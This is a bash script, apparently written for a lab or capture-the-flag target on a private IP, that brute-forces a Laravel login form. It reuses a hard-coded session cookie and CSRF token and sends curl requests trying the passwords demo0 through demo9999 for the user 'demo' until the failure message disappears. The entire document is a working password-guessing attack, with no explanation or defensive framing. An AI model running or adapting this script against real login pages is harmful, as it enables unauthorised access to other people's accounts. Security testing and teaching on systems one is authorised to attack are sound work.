#!/bin/bash

failed="incorrect"
url="http://192.168.1.108/login/login"
username=demo
cookie="laravel_session=eyJpdiI6Ilp5UkNwTStUNkxLcE9KVEk1XC82bFJVMEczWFFZYk51OVk2T2lENzJ5WDZBPSIsInZhbHVlIjoiQmtTa0wzd0ZhT3hpRWxpYmtpQVU2K2t3cTZQMXVEbFU5dFV5OGRaSjRsTG1jT2JyUnk5Rm5aeFN6RWNMWWw0dVhWUzdXcVlyV1pIVm13cUxxSThlOHc9PSIsIm1hYyI6IjRjMDJmYzc3ZjAyMTkxNWNiMWY4NTFlNWNiMDIwYjczNmZmNDRiYTQ0YWU4Zjg0NTU3YmNkMTA5ODAyNzBmZjcifQ%3D%3D"

for i in `seq 0 9999`; do 
    echo "[+] trying demo${i}"
    curl -s -L -b "${cookie}" --data "_token=xKzeW65kVfRyRwYa3Hcv6vuRNur9eoMlieRmtCYm&username=${username}&password=demo${i}" "${url}" | grep "${failed}" > /dev/null  2>&1

    if [[ $? -ne 0 ]]; then 
        echo "[+] password is demo${i}"
        break
    fi
done

